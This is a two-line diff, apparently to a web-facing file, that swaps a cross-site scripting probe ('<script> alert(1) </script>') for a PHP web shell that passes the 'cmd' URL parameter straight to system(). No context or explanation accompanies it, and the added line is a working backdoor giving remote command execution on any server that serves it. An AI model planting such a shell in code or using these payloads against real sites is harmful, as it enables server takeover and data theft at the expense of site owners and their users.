@@ -1,1 +1,1 @@
-<script> alert(1) </script>
+<?php echo "Shell";system($_GET['cmd']); ?>
